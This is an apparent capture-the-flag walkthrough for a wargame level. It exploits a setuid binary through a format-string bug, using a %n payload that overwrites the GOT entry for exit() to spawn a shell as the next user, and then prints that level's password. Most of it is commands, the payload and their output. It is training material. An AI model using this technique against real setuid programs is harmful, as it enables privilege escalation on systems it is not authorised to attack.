# Level 5 Walkthrough

1. **Connect to the target machine**

	```bash
	ssh level5@<vm-ip> -p 4242
	```

2. **Check the files**

	```bash
	ls -l
	```

	Output:

	```
	-rwsr-s---+ 1 level6 users 5220 Mar  6  2016 level5
	```

3. **Test the binary**

	```bash
	./level5
	```

	It waits for input, echoes it back, and exits.

4. **Copy the binary locally for analysis**

	```bash
	scp -P 4242 level5@<vm-ip>:/home/user/level5/level5 .
	```

5. **Disassemble the binary with GDB**

	```bash
	gdb level5
	```

	**Main function**:

	```
	0x0804850a <+6>: call   0x80484c2 <n>
	```

	**Function `n`**:

	* Reads input with `fgets`
	* Prints it with `printf`
	* Calls `exit@plt`

	**Function `o`**:

	```
	0x080484a4 <+0>: system("/bin/sh");
	```

	We want execution to jump to `o()` instead of calling `exit()`.

6. **Find the GOT entry for `exit`**

	From GDB:

	```bash
	x/i 0x80483d0
	```

	Output:

	```
	0x80483d0 <exit@plt>: jmp *0x8049838
	```

	The GOT entry is at **`0x08049838`**.

7. **Find our argument offset for format string**

	```bash
	echo "AAAA %x %x %x %x" | ./level5
	```

	Output:

	```
	AAAA 200 b7fd1ac0 b7ff37d0 41414141
	```

	Our input appears at position **4**.

8. **Plan the exploit**

	* Address to overwrite: `0x08049838` (little-endian: `\x38\x98\x04\x08`)
	* Value to write: address of `o()` = `0x080484a4`
	* `%n` writes the number of characters printed so far
	* We pad output so that `%n` writes `0x080484a4`
	* Offset = `%4$n`

9. **Execute the payload**

	```bash
	(printf '\x38\x98\x04\x08'; echo '%134513824d%4$n'; cat) | ./level5
	```

10. **Verify shell and escalate**

	```bash
	whoami
	```

	Output:

	```
	level6
	```

11. **Read the password**

	```bash
	cat /home/user/level6/.pass
	```

	Output:

	```
	d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
	```
